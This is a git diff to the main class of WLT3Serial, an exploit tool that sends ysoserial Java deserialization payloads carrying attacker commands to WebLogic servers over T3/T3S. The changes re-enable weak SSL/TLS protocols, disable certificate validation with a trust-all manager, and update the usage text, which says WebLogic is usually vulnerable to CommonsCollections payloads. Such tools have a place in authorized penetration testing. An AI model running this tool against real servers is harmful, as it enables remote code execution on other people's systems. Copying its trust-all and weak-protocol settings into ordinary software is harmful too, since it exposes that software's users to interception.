@@ -3,7 +3,8 @@
 	
 	v0.3 ()
 	
-	Main class for executing java deserialization exploit against WebLogic Servers hosting a T3 or T3S listener. Parses command options then executes exploit with those options.
+	Main class for executing java deserialization exploit against WebLogic Servers hosting a T3 or T3S listener. Parses command options, configures JVM SSL/TLS settings (if T3S
+	connection will be used), then executes exploit with set options.
 */
 
 package bort.millipede.wlt3;
@@ -12,6 +13,8 @@ import java.util.Collections;
 import java.util.List;
 import java.util.ArrayList;
 import java.security.Security;
+import javax.net.ssl.SSLContext;
+import javax.net.ssl.TrustManager;
 
 //third-party includes
 import ysoserial.Strings;
@@ -95,7 +98,6 @@ public class WLT3Serial {
 								return;
 							}
 							break;
-						case "--t3s": //use T3S connection
 						case "--t3s=TLSv1.2": //use T3S to connect with TLSv1.2
 							if(!tlsSet) {
 								t3s = true;
@@ -118,6 +120,7 @@ public class WLT3Serial {
 								return;
 							}
 							break;
+						case "--t3s": //use T3S to connect (with TLSv1)
 						case "--t3s=TLSv1": //use T3S to connect with TLSv1
 							if(!tlsSet) {
 								t3s = true;
@@ -214,48 +217,105 @@ public class WLT3Serial {
 		}
 	}
 	
-	//Disable all SSL/TLS protocols not chosen during application initialization in JVM
-	private static void setSSLTLSProtocol() {
+	//Set SSL/TLS options: enable desired protocol(s) and disable protocols not chosen during application startup
+	private static void setSSLTLSProtocol() throws Exception {
 		String tlsSysProp = System.getProperty("jdk.tls.client.protocols");
+
+		//check if 'jdk.tls.disabledAlgorithms' Security property is set, and remove SSLv3 if set
 		String tlsSecProp = Security.getProperty("jdk.tls.disabledAlgorithms");
-		if(tlsSecProp==null) tlsSecProp = "";
-		ArrayList<String> protocols = new ArrayList<String>(5);
-		protocols.add("SSLv2Hello");
-		protocols.add("SSLv3");
-		protocols.add("TLSv1");
-		protocols.add("TLSv1.1");
-		protocols.add("TLSv1.2");		
+		if(tlsSecProp!=null) {
+			ArrayList<String> protocols = new ArrayList<String>(5);
+			protocols.add("SSLv2Hello");
+			protocols.add("SSLv3");
+			protocols.add("TLSv1");
+			protocols.add("TLSv1.1");
+			protocols.add("TLSv1.2");
+			
+			String disabledProts = null;
+			if(tlsSysProp.contains("SSL")) { //using SSL protocol(s) for connection
+				protocols.remove("SSLv3");
+				if(tlsSysProp.contains("SSLv2Hello")) protocols.remove("SSLv2Hello");
+				disabledProts = join(protocols,", ");
 		
-		String disabledProts = null;
-		if(tlsSysProp.contains("SSL")) { //using SSL protocol(s) for connection
-			protocols.remove("SSLv3");
-			if(tlsSysProp.contains("SSLv2Hello")) protocols.remove("SSLv2Hello");
-			disabledProts = join(protocols,", ");
-			
-			if(tlsSecProp.contains("SSLv3")) {
-				tlsSecProp = tlsSecProp.replace("SSLv3", disabledProts);
-			} else {
-				tlsSecProp = tlsSecProp.trim();
+				if(tlsSecProp.contains("SSLv3")) {
+					tlsSecProp = tlsSecProp.replace("SSLv3", disabledProts);
+				} else {
+					tlsSecProp = tlsSecProp.trim();
+					if(!tlsSecProp.isEmpty()) tlsSecProp += ", ";
+					tlsSecProp += disabledProts;
+				}
+			} else { //using TLS protocol for connection
+				switch(tlsSysProp) {
+					case "TLSv1.2":
+						protocols.remove("TLSv1.2");
+						break;
+					case "TLSv1.1":
+						protocols.remove("TLSv1.1");
+						break;
+					case "TLSv1":
+						protocols.remove("TLSv1");
+						break;
+				}
+				
 				if(!tlsSecProp.isEmpty()) tlsSecProp += ", ";
-				tlsSecProp += disabledProts;
+				tlsSecProp += join(protocols,", ");
 			}
-		} else { //using TLS protocol for connection
-			switch(tlsSysProp) {
-				case "TLSv1.2":
-					protocols.remove("TLSv1.2");
-					break;
-				case "TLSv1.1":
-					protocols.remove("TLSv1.1");
-					break;
-				case "TLSv1":
-					protocols.remove("TLSv1");
-					break;
-			}
+			Security.setProperty("jdk.tls.disabledAlgorithms",tlsSecProp);
+		} else { //jdk.tls.disabledAlgorithms is not set in running JVM: if JVM is version 8, set property
+			if(!isJVM7()) {
+				ArrayList<String> protocols = new ArrayList<String>(5);
+				protocols.add("SSLv2Hello");
+				protocols.add("SSLv3");
+				protocols.add("TLSv1");
+				protocols.add("TLSv1.1");
+				protocols.add("TLSv1.2");
+				
+				String disabledProts = null;
+				if(tlsSysProp.contains("SSL")) { //using SSL protocol(s) for connection
+					protocols.remove("SSLv3");
+					if(tlsSysProp.contains("SSLv2Hello")) protocols.remove("SSLv2Hello");
+					disabledProts = join(protocols,", ");
 			
-			if(!tlsSecProp.isEmpty()) tlsSecProp += ", ";
-			tlsSecProp += join(protocols,", ");
+					if(tlsSecProp.contains("SSLv3")) {
+						tlsSecProp = tlsSecProp.replace("SSLv3", disabledProts);
+					} else {
+						tlsSecProp = tlsSecProp.trim();
+						if(!tlsSecProp.isEmpty()) tlsSecProp += ", ";
+						tlsSecProp += disabledProts;
+					}
+				} else { //using TLS protocol for connection
+					switch(tlsSysProp) {
+						case "TLSv1.2":
+							protocols.remove("TLSv1.2");
+							break;
+						case "TLSv1.1":
+							protocols.remove("TLSv1.1");
+							break;
+						case "TLSv1":
+							protocols.remove("TLSv1");
+							break;
+					}
+					
+					if(!tlsSecProp.isEmpty()) tlsSecProp += ", ";
+					tlsSecProp += join(protocols,", ");
+				}
+				Security.setProperty("jdk.tls.disabledAlgorithms",tlsSecProp);
+			}
 		}
-		Security.setProperty("jdk.tls.disabledAlgorithms",tlsSecProp);
+		
+		if(isJVM7()) { //running JVM is version 7 or lower: set custom SSLSocketFactory implementation as default
+			Security.setProperty("ssl.SocketFactory.provider","bort.millipede.wlt3.CustomSSLSocketFactory");
+		} else { //running JVM is version 8 or higher: set default SSLContext with SSL/TLS certificate validation disabled
+			SSLContext defaultContext = null;
+			if(tlsSysProp.contains("SSL")) {
+				defaultContext = SSLContext.getInstance("SSL");
+			} else {
+				defaultContext = SSLContext.getInstance(tlsSysProp);
+			}
+			TrustManager[] trustAll = new TrustManager[] {new TrustAllCertsManager()};
+			defaultContext.init(null,trustAll,null);
+			SSLContext.setDefault(defaultContext);
+		}
 	}
 	
 	//join List<String> into String with specified delimeter
@@ -277,6 +337,11 @@ public class WLT3Serial {
 		return retVal;
 	}
 	
+	//check if running JVM is Java 7
+	private static boolean isJVM7() {
+		return (Double.parseDouble(System.getProperty("java.vm.specification.version")) < 1.8);
+	}
+	
 	//print Usage information
 	private static void usage() {
 		System.err.println("Usage: WLT3Serial [OPTIONS] REMOTE_HOST REMOTE_PORT PAYLOAD_TYPE PAYLOAD_CMD");
@@ -288,8 +353,8 @@ public class WLT3Serial {
 		System.err.println("\t\t\tBind\t\tSend ysoserial payload as object to bind to name (via javax.naming.Context.bind(), also similar to JavaUnserializeExploits weblogic.py)");
 		System.err.println("\t\t\tWLBind\t\tSend ysoserial payload as WebLogic RMI object to bind to name (via weblogic.rmi.Naming.bind(), similar to ysoserial.exploit.RMIRegistryExploit)\n");
 		System.err.println("\t--t3s[=PROTOCOL]\t\tUse T3S (transport-encrypted) connection (Disabled by default)");
-		System.err.println("\t\tProtocols:\n\t\t\tTLSv1.2 (Default)\n\t\t\tTLSv1.1\n\t\t\tTLSv1\n\t\t\tSSLv3");
-		System.err.println("\t\t\tSSLv2 (SSLv2Hello handshake only, then fallback to SSLv3 for communication: this is a Java limitation, not a tool limitation)\n\n");
+		System.err.println("\t\tProtocols:\n\t\t\tTLSv1.2\n\t\t\tTLSv1.1\n\t\t\tTLSv1 (Default)\n\t\t\tSSLv3");
+		System.err.println("\t\t\tSSLv2 (SSLv2Hello handshake only, then fallback to SSLv3 for communication: this is an Oracle Java limitation, not a tool limitation)\n\n");
 		
 		//list available ysoserial payload types, or print error on failure
 		System.err.println("Available Payload Types (WebLogic is usually vulnerable to \"CommonsCollectionsX\" types):");
